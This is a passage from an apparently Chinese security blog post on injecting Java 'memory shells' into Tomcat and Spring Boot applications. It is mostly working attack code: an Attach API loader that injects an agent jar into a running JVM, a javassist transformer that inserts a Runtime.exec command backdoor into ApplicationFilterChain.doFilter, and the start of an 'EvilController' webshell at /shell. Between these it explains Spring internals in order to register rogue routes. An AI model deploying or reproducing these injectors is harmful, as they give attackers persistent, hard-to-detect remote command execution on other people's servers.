class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">            System.out.println(toolsPath.toURI().toURL());</span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            java.util.List&lt;Object&gt; list = (java.util.List&lt;Object&gt;) listMethod.invoke(MyVirtualMachine,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                System.out.println(name);</span><br><span class="line">                <span class="keyword">if</span> (name.equals(<span class="string">&quot;com.example.vul_demo.VulDemoApplication&quot;</span>))&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (java.lang.String) getId.invoke(o,<span class="literal">null</span>);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以下项目打成jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassFileTransformer的实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().write(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().close();\n&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">                m.insertBefore(a);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用生成的payload打，以下是注入结果：</p><p><a href="https://pic.imgdb.cn/item/64d2702a1ddac507cc0afc5c.jpg" title="image-20230804132524409" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2702a1ddac507cc0afc5c.jpg" alt="image-20230804132524409"></a></p><p><a href="https://pic.imgdb.cn/item/64d270381ddac507cc0b22d0.jpg" title="image-20230804132558767" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270381ddac507cc0b22d0.jpg" alt="image-20230804132558767"></a></p><p>可以看到，上面提到的这种注入Java Agent内存马的方法仍然需要上传文件。不过，在rebeyond师傅的这篇文章<a href="https://xz.aliyun.com/t/11640">https://xz.aliyun.com/t/11640</a>介绍了通过Java AgentNoFile的方式植入内存马，整个过程中不会有文件在磁盘上落地，而且不会在JVM中新增类，甚至连方法也不会增加。膜一波！</p><h3 id="SpringMVC-Controller-内存马注入"><a href="#SpringMVC-Controller-内存马注入" class="headerlink" title="SpringMVC Controller 内存马注入"></a>SpringMVC Controller 内存马注入</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h5><p>Spring容器就是ApplicationContext，它是一个接口，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。从ApplicationContext中可以根据Bean的ID获取Bean。</p><p>Spring还提供另一种IoC容器叫BeanFactory，使用方式和ApplicationContext类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XmlBeanFactory</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;application.xml&quot;</span>));</span><br><span class="line"><span class="type">MailService</span> <span class="variable">mailService</span> <span class="operator">=</span> factory.getBean(MailService.class);</span><br></pre></td></tr></table></figure><p>BeanFactory和ApplicationContext的区别在于: BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。实际上ApplicationContext接口是从BeanFactory接口继承而来的。BeanFactory 接口是Spring IoC容器的实际代表者。</p><h5 id="ContextLoaderListener与DispatcherServlet"><a href="#ContextLoaderListener与DispatcherServlet" class="headerlink" title="ContextLoaderListener与DispatcherServlet"></a>ContextLoaderListener与DispatcherServlet</h5><p>一个典型Spring 应用的web.xml 配置示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns:xsi=<span class="string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="line">         xmlns=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&quot;</span></span><br><span class="line">         version=<span class="string">&quot;2.5&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;HelloSpringMVC&lt;/display-name&gt;</span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">    &lt;/listener&gt;</span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;/WEB-INF/dispatcherServlet-servlet.xml&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;<span class="number">1</span>&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><ul><li><p>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，其余都是Child Context。</p></li><li><p>所有Child Context都可以访问在Root Context中定义的bean，但是Root Context无法访问Child Context中定义的 bean。</p></li><li><p>所有的Context在创建后，会作为一个属性被添加到了ServletContext中。</p></li></ul><p><strong>ContextLoaderListener</strong> 主要被用来初始化全局唯一的Root Context，即Root WebApplicationContext。这个Root WebApplicationContext会和其他Child Context实例共享它的IoC容器，供其他Child Context获取并使用容器中的bean。</p><p>ContextLoaderListener本质上是一个监听器。Spring 实现了 Tomcat 提供的 ServletContextListener 接口，写了一个监听器来监听项目启动，一旦项目启动，会触发 ContextLoaderListener 中的特定方法 <strong>contextInitialized</strong></p><p>也就是说 Tomcat 的 ServletContext 创建时，会调用 ContextLoaderListener 的 contextInitialized()，这个方法内部的 initWebApplicationContext()就是用来初始化 Spring 的 IOC 容器的。</p><ol><li><p>ServletContext 对象是 Tomcat 的；</p></li><li><p>ServletContextListener 是 Tomcat 提供的接口；</p></li><li><p>ContextLoaderListener 是 Spring 写的，实现了 ServletContextListener；</p></li><li><p>Spring 自己写的监听器，用来创建 Spring IOC 容器；</p></li></ol><p>其相关配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure><p><strong>DispatcherServlet</strong> 从本质上来讲是一个 Servlet（它继承自HttpServlet）。它的主要作用是处理传入的web请求，根据配置的URL pattern，将请求分发给正确的Controller和View。DispatcherServlet初始化完成后，会创建一个普通的Child Context实例。</p><p><strong>综上：</strong> 每个具体的DispatcherServlet创建的是一个Child Context，代表一个独立的IoC容器；而 ContextLoaderListener所创建的是一个Root Context，代表全局唯一的一个公共 IoC 容器。</p><p>如果要访问和操作bean，一般要获得当前代码执行环境的IoC 容器（Child Context）代表者ApplicationContext。</p><p>有以下几种办法获取代码运行时的上下文环境：</p><p><strong>第一种：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoaderListener.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>getCurrentWebApplicationContext 获得的是 Root WebApplicationContext。但是请注意，打入内存马使用这种方式获取上下文环境时有一些限制，一种是目标不能是SpringBoot。我们刚刚看到ContextLoaderListener 如果要实现它应有的功能，是需要在 web.xml 中配置的。而 SpringBoot 中无论是以 main 方法还是 spring-boot:run 的方式执行都不跑 SpringBootServletInitializer 中的 onStartup， 导致 ContextLoaderListener 没有执行。因此通过这种办法获取到的context为null：</p><p><a href="https://pic.imgdb.cn/item/64d270451ddac507cc0b42ad.jpg" title="image-20230808005326916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270451ddac507cc0b42ad.jpg" alt="image-20230808005326916"></a></p><p>还有一直限制就是有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件，这时候通过这种方法也是获取不到Root WebApplicationContext的。</p><p><strong>第二种：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用这种方法可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。</p><h4 id="流程分析-4"><a href="#流程分析-4" class="headerlink" title="流程分析"></a>流程分析</h4><p>先编写一个简单的Controller，之后在Controller类下断，然后访问配置的路由：</p><p><a href="https://pic.imgdb.cn/item/64d270581ddac507cc0b7287.jpg" title="image-20230807221029340" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270581ddac507cc0b7287.jpg" alt="image-20230807221029340"></a></p><p>DispatcherServlet的主要作用是处理传入的web请求，根据配置的URL pattern，将请求分发给正确的Controller和View。我们可以看到我们的Web请求经过DispatcherServlet的doDispatch方法处理后被转发了过来：</p><p><a href="https://pic.imgdb.cn/item/64d270631ddac507cc0b8bf1.jpg" title="image-20230807221156182" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270631ddac507cc0b8bf1.jpg" alt="image-20230807221156182"></a></p><p>对调用栈向上回溯看看DispatcherServlet是怎么做的分发：</p><p><a href="https://pic.imgdb.cn/item/64d2706e1ddac507cc0ba5f5.jpg" title="image-20230807221313308" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2706e1ddac507cc0ba5f5.jpg" alt="image-20230807221313308"></a></p><p>通过调用HandlerAdapter类的handle方法对request和response对象进行处理，并且通过调用org.springframework.web.servlet.HandlerExecutionChain#getHandler方法获取了mappedHandler的handler字段。我们看一下mappedHandler是怎么来的：</p><p><a href="https://pic.imgdb.cn/item/64d270771ddac507cc0bbe88.jpg" title="image-20230807223847138" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270771ddac507cc0bbe88.jpg" alt="image-20230807223847138"></a></p><p>跟进<code>org.springframework.web.servlet.DispatcherServlet#getHandler</code>：</p><p><a href="https://pic.imgdb.cn/item/64d270891ddac507cc0be788.jpg" title="image-20230807223913403" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270891ddac507cc0be788.jpg" alt="image-20230807223913403"></a></p><p>可以发现mappedHandler是对handlerMappings遍历后调用getHandler()得到的，打下断点，跟进到了<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code>：</p><p><a href="https://pic.imgdb.cn/item/64d270991ddac507cc0c1114.jpg" title="image-20230807224114663" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270991ddac507cc0c1114.jpg" alt="image-20230807224114663"></a></p><p>在此处又调用了相应HandlerMapping实现类的getHandlerInternal()方法：</p><p><a href="https://pic.imgdb.cn/item/64d270a61ddac507cc0c3088.jpg" title="image-20230807224322836" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270a61ddac507cc0c3088.jpg" alt="image-20230807224322836"></a></p><p>跟进后，发现又调用了父类的getHandlerInternal()方法，即`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal`：</p><p><a href="https://pic.imgdb.cn/item/64d270b01ddac507cc0c4718.jpg" title="image-20230807224622982" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270b01ddac507cc0c4718.jpg" alt="image-20230807224622982"></a></p><p>首先获取了我们设置的路由，之后对mappingRegistry进行上锁，最后解锁。在mappingRegistry中存储了路由信息：</p><p><a href="https://pic.imgdb.cn/item/64d270bf1ddac507cc0c6da6.jpg" title="image-20230807224651916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270bf1ddac507cc0c6da6.jpg" alt="image-20230807224651916"></a></p><p>之后调用了org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod，我们跟进一下：</p><p><a href="https://pic.imgdb.cn/item/64d270c81ddac507cc0c837d.jpg" title="image-20230807225613423" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270c81ddac507cc0c837d.jpg" alt="image-20230807225613423"></a></p><p>可以看到，是从mappingRegistry中获取路由。那接下来我们需要做的就是在mappingRegistry中添加路由。在AbstractHandlerMethodMapping中就提供了registerMapping添加路由。</p><p><a href="https://pic.imgdb.cn/item/64d270d31ddac507cc0c9df0.jpg" title="image-20230807231950009" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270d31ddac507cc0c9df0.jpg" alt="image-20230807231950009"></a></p><p>但是AbstractHandlerMethodMapping类为抽象类。不过我们可以从当前上下文环境中获得RequestMappingHandlerMapping的实例bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><h4 id="反序列化注入SpringBoot-Controller-内存马"><a href="#反序列化注入SpringBoot-Controller-内存马" class="headerlink" title="反序列化注入SpringBoot Controller 内存马"></a>反序列化注入SpringBoot Controller 内存马</h4><p>在给出EXP前，首先给大家提一个醒，springboot 2.6.x 以上版本对路由匹配方式进行了修改，以往的手动注册方式会导致任意请求提示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: </span><br><span class="line">Expected lookupPath in request attribute <span class="string">&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span>.</span><br></pre></td></tr></table></figure><p>在网上找解决办法有三种，一种是降低版本，一种是修改默认映射策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.mvc.pathmatch.matching-strategy=ANT_PATH_MATCHER</span><br></pre></td></tr></table></figure><p>还有一种方法：<a href="https://blog.csdn.net/maple_son/article/details/122572869">https://blog.csdn.net/maple_son&#x2F;article&#x2F;details&#x2F;122572869</a></p><p>因此如果我们直接利用网上给出的EXP来向SpringBoot中注入内存马，是打不成功的。此处给出我写好的EXP，根据注释应该可以看懂。先写一个恶意的Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/shell&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">MemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span 